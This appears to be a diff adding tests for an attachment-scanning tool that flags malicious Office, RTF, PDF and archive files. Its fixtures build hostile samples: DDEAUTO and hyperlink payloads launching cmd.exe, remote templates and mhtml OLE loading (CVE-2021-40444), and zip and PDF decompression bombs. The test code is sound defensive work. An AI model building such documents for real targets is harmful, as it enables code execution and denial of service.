@@ -5,11 +5,13 @@
  * checker or filled memory. Fixtures are built here; nothing can run.
  */
 import assert from 'node:assert/strict';
-import { deflateSync } from 'node:zlib';
+import { deflateRawSync, deflateSync } from 'node:zlib';
 import { describe, it } from 'node:test';
 import { inspectFile } from '../src/client/tool-attachment.mjs';
 import { readCfb } from '../src/client/cfb.mjs';
-import { PROGRAM_STUB, cfb, docx, join, latin1, u16, utf16le, utf8, zip } from './build-files.mjs';
+import { inspectDocument } from '../src/client/tool-document.mjs';
+import { readZip } from '../src/client/zip.mjs';
+import { PROGRAM_STUB, cfb, docx, join, latin1, u16, u32, utf16le, utf8, zip } from './build-files.mjs';
 
 /** @param {Uint8Array | string} data @param {string} name */
 const check = (data, name) => inspectFile(new Blob([/** @type {Uint8Array<ArrayBuffer>} */ (typeof data === 'string' ? utf8(data) : data)]), name);
@@ -370,4 +372,151 @@ function isoFanOut() {
     record(at, root + (i % dirSectors), 3, 0x41 + (i % 26));
   }
   return bytes;
+}
+
+/* ---------- Final review, 2026-11-15 ---------- */
+
+const rel = (/** @type {string} */ type, /** @type {string} */ target, external = true) => `<Relationship Id="rId9" Type="${REL}/${type}" Target="${target}"${external ? ' TargetMode="External"' : ''}/>`;
+
+describe('final review: missed detections', () => {
+  it('finds an external OLE object loaded through mhtml: (CVE-2021-40444) and templates on shares written as file: addresses', async () => {
+    assert.deepEqual(keys(await check(docx({ rels: rel('oleObject', 'mhtml:http://198.51.100.7/x.html!x-usc:http://198.51.100.7/x.html') }), 'a.docx')), ['remote']);
+    const settings = (/** @type {string} */ target) => docx({ parts: [{ name: 'word/_rels/settings.xml.rels', data: `<Relationships>${rel('attachedTemplate', target)}</Relationships>` }] });
+    for (const target of ['file:///\\\\198.51.100.7\\share\\t.dotm', 'file:////198.51.100.7/share/t.dotm']) assert.deepEqual(keys(await check(settings(target), 'b.docx')), ['remote'], target);
+  });
+
+  it('finds remote templates and fields in RTF and Word documents', async () => {
+    assert.deepEqual(keys(await check(latin1('{\\rtf1{\\*\\template http://198.51.100.7/t.doc}Hello}'), 'c.rtf')), ['remote']);
+    assert.deepEqual(keys(await check(latin1('{\\rtf1{\\field{\\*\\fldinst INCLUDEPICTURE "\\\\\\\\198.51.100.7\\\\s\\\\a.png" \\\\d}{\\fldrslt x}}}'), 'c.rtf')), ['remote']);
+    const field = '<w:p><w:r><w:instrText> INCLUDEPICTURE "http://198.51.100.7/pixel.png" \\d </w:instrText></w:r></w:p>';
+    assert.deepEqual(keys(await check(docx({ body: field }), 'c.docx')), ['remote']);
+  });
+
+  it('opens an RTF chunk inside a Word document (altChunk)', async () => {
+    const rtf = '{\\rtf1{\\object\\objemb\\objupdate{\\*\\objclass Equation.3}{\\*\\objdata 01050000020000000b0000004571756174696f6e2e3300}}}';
+    const report = await check(docx({ rels: rel('aFChunk', 'afchunk.rtf', false), body: '<w:altChunk r:id="rId9"/>', parts: [{ name: 'word/afchunk.rtf', data: rtf }] }), 'invoice.docx');
+    assert.equal(report.verdict, 'active');
+    assert.deepEqual(values(report, 'insideActive'), ['afchunk.rtf']);
+  });
+
+  it('finds "run program" actions in slide layouts and program links written as file: addresses', async () => {
+    const show = zip([
+      { name: '[Content_Types].xml', data: '<Types/>' },
+      { name: 'ppt/presentation.xml', data: '<p:presentation/>' },
+      { name: 'ppt/slideLayouts/slideLayout1.xml', data: '<p:sldLayout><a:hlinkHover r:id="rId9" action="ppaction://program"/></p:sldLayout>' },
+      { name: 'ppt/slideLayouts/_rels/slideLayout1.xml.rels', data: `<Relationships>${rel('hyperlink', 'file:///C:\\Windows\\System32\\cmd.exe /c calc')}</Relationships>` },
+    ]);
+    assert.deepEqual(values(await check(show, 'e.pptx'), 'linkToProgram'), ['file:///C:\\Windows\\System32\\cmd.exe /c calc']);
+  });
+
+  it('finds DDEAUTO in a Word 97–2003 document', async () => {
+    const word = cfb([{ path: 'WordDocument', data: join(new Uint8Array(1536), latin1('\x13 DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc" \x14x\x15')) }, { path: '1Table', data: new Uint8Array(600) }]);
+    assert.ok(keys(await check(word, 'd.doc')).includes('dde'));
+  });
+});
+
+describe('final review: false alarms', () => {
+  it('does not flag JS or AA that only appear inside stream data', async () => {
+    const data = 'thumbnail/JS/x/AA/y/JavaScript/OpenAction';
+    const pdf = latin1(`%PDF-1.7\n1 0 obj << /Type /Catalog >> endobj\n2 0 obj << /Length ${data.length} >>\nstream\n${data}\nendstream\nendobj\ntrailer << /Root 1 0 R >>\n%%EOF`);
+    assert.deepEqual(keys(await check(pdf, 'brochure.pdf')), []);
+    const report = await inspectDocument(pdf);
+    assert.ok(!report.findings.some((finding) => finding.key === 'scripts'), 'the document tool reads only dictionaries too');
+  });
+
+  it('does not call ordinary hyperlinks links to programs', async () => {
+    for (const target of ['Explorer brochure.pdf', 'C:\\Manuals\\Explorer-2024.pdf', 'curl-notes.txt', 'www.example.com', 'www.firma.pl', '\\\\fileserver\\Finance\\Q3.xlsx', 'tel:+15551234567']) {
+      assert.deepEqual(keys(await check(docx({ rels: rel('hyperlink', target) }), 'f.docx')), [], target);
+    }
+    assert.deepEqual(keys(await check(docx({ rels: rel('hyperlink', '\\\\fileserver\\Finance\\update.exe') }), 'f.docx')), ['linkToProgram'], 'a program on a share still is');
+  });
+
+  it('does not call structured data in a newsletter a script', async () => {
+    assert.deepEqual(keys(await check('<html><head><script type="application/ld+json">{"@type":"Order"}</script></head><body>Hi</body></html>', 'mail.html')), ['webPage']);
+  });
+
+  it('does not report attachments sent as links in a message as unread', async () => {
+    const message = cfb([{ path: '__properties_version1.0', data: new Uint8Array(32) }, { path: '__attach_version1.0_#00000000/__substg1.0_3707001F', data: utf16le('Budget.xlsx') }]);
+    assert.deepEqual(keys(await check(message, 'mail.msg')), []);
+  });
+});
+
+describe('final review: hostile files and counts', () => {
+  it('charges failed reads to the budget, so a repeated inflation runs once', async () => {
+    const stored = deflateRawSync(Buffer.alloc(16 * 1024 * 1024 - 1), { level: 9 });
+    await within(4000, () => check(overlapZip(300, 'a.bin', stored, 16 * 1024 * 1024, (i) => `a${i}.bin`), 'm.zip'));
+    await within(4000, () => check(overlapZip(300, 'x.rels', stored, 16 * 1024 * 1024, (i) => (i === 0 ? '[Content_Types].xml' : `r${i}.rels`)), 'o.docx'));
+    const bomb = deflateSync(Buffer.alloc(64 * 1024 * 1024 + 1024), { level: 9 });
+    const parts = [latin1(`%PDF-1.7\n1 0 obj\n<</Length ${bomb.length} /Filter /FlateDecode>>stream\n`), bomb, latin1('\nendstream\nendobj\n')];
+    for (let i = 0; i < 100; i += 1) parts.push(latin1(`${i + 2} 0 obj\n<</Type /Filespec /F (a${i}.exe) /EF <</F 1 0 R>>>>\nendobj\n`));
+    await within(4000, () => check(join(...parts), 's.pdf'));
+  });
+
+  it('bounds object streams that overlap or inflate a lot, in both PDF readers', async () => {
+    const count = 2000;
+    const size = 1024 * 1024;
+    const pairs = Array.from({ length: count }, (_, i) => `${i + 10} ${i % 2 ? size : 0}`).join(' ') + ' ';
+    const packed = deflateSync(Buffer.concat([Buffer.from(pairs), Buffer.alloc(size, 0x41)]), { level: 9 });
+    const pdf = join(latin1(`%PDF-1.7\n1 0 obj\n<</Type /ObjStm /N ${count} /First ${pairs.length} /Length ${packed.length} /Filter /FlateDecode>>stream\n`), packed, latin1('\nendstream\nendobj\ntrailer<</Root 1 0 R>>\n%%EOF\n'));
+    await within(3000, () => check(pdf, 'o.pdf'));
+    await within(3000, () => inspectDocument(pdf));
+    const bomb = deflateSync(Buffer.alloc(64 * 1024 * 1024 + 1024), { level: 9 });
+    const many = [latin1('%PDF-1.7\n')];
+    for (let i = 0; i < 12; i += 1) many.push(latin1(`${i + 1} 0 obj\n<</Type /ObjStm /N 1 /First 4 /Length ${bomb.length} /Filter /FlateDecode>>stream\n`), bomb, latin1('\nendstream\nendobj\n'));
+    await within(5000, () => check(join(...many), 'b.pdf'));
+  });
+
+  it('stays fast on deep folder names, attachment entries without endobj, and archives of archives', async () => {
+    await within(1500, () => check(zip([{ name: `${'a/'.repeat(30000)}x`, data: 'x' }]), 'p.zip'));
+    const specs = ['%PDF-1.7\n1 0 obj\n<</Length 0>>stream\n\nendstream\n', ...Array.from({ length: 30000 }, () => '2 0 obj<</EF<</F 1 0 R>>>>\n')].join('');
+    await within(3000, () => check(latin1(specs), 'i.pdf'));
+    const inner = zip(Array.from({ length: 2000 }, (_, i) => ({ name: `${i}`, data: 'x' })));
+    const outer = zip(Array.from({ length: 60 }, (_, i) => ({ name: `${i}.zip`, data: inner, deflate: true })));
+    await within(6000, () => check(outer, 'n.zip'));
+  });
+
+  it('counts the files inside nested archives', async () => {
+    const inner = zip(Array.from({ length: 2000 }, (_, i) => ({ name: `${i}`, data: 'x' })));
+    assert.equal((await check(zip([{ name: 'a.zip', data: inner, deflate: true }, { name: 'b.zip', data: inner, deflate: true }]), 'n.zip')).insideTotal, 4002);
+  });
+
+  it('reads a ZIP with ZIP64 end records whose first directory entry is 76 bytes long', async () => {
+    const archive = zip([{ name: 'quarterly-report-final-v2.docx', data: 'x' }, { name: 'payload.exe', data: 'MZ' }, { name: 'c.txt', data: 'c' }]);
+    const view = new DataView(archive.buffer);
+    const end = archive.length - 22;
+    const size = view.getUint32(end + 12, true);
+    const start = view.getUint32(end + 16, true);
+    const record = [...u32(0x06064b50), ...u32(44), 0, 0, 0, 0, ...u16(45), ...u16(45), ...u32(0), ...u32(0), ...u32(3), ...u32(0), ...u32(3), ...u32(0), ...u32(size), ...u32(0), ...u32(start), ...u32(0)];
+    const locator = [...u32(0x07064b50), ...u32(0), ...u32(end), ...u32(0), ...u32(1)];
+    const zip64 = join(archive.subarray(0, end), record, locator, archive.subarray(end));
+    assert.deepEqual(readZip(zip64).map((entry) => entry.name), ['quarterly-report-final-v2.docx', 'payload.exe', 'c.txt']);
+  });
+
+  it('says a tar entry cut short was not read', async () => {
+    const header = new Uint8Array(512);
+    header.set(latin1('a.exe'));
+    header.set(latin1('00000001000\0'), 124);
+    header[156] = 0x30;
+    header.set(latin1('ustar\x0000'), 257);
+    assert.ok(keys(await check(join(header, new Uint8Array(100)), 'a.tar')).includes('partlyRead'));
+  });
+});
+
+/**
+ * A ZIP whose directory entries all point at one local header and one stored stream.
+ * @param {number} count @param {string} localName @param {Uint8Array} stored @param {number} declared @param {(i: number) => string} centralName
+ */
+function overlapZip(count, localName, stored, declared, centralName) {
+  const shared = (/** @type {number} */ nameLength) => [...u16(0), ...u16(8), ...u32(0), ...u32(0), ...u32(stored.length), ...u32(declared), ...u16(nameLength), ...u16(0)];
+  const nameBytes = latin1(localName);
+  const local = Uint8Array.from([...u32(0x04034b50), ...u16(20), ...shared(nameBytes.length), ...nameBytes]);
+  /** @type {Uint8Array[]} */
+  const central = [];
+  for (let i = 0; i < count; i += 1) {
+    const name = latin1(centralName(i));
+    central.push(Uint8Array.from([...u32(0x02014b50), ...u16(20), ...u16(20), ...shared(name.length), ...u16(0), ...u16(0), ...u16(0), ...u32(0), ...u32(0)]), name);
+  }
+  const directory = Buffer.concat(central);
+  const end = Uint8Array.from([...u32(0x06054b50), ...u16(0), ...u16(0), ...u16(count), ...u16(count), ...u32(directory.length), ...u32(local.length + stored.length), ...u16(0)]);
+  return new Uint8Array(Buffer.concat([local, stored, directory, end]));
 }
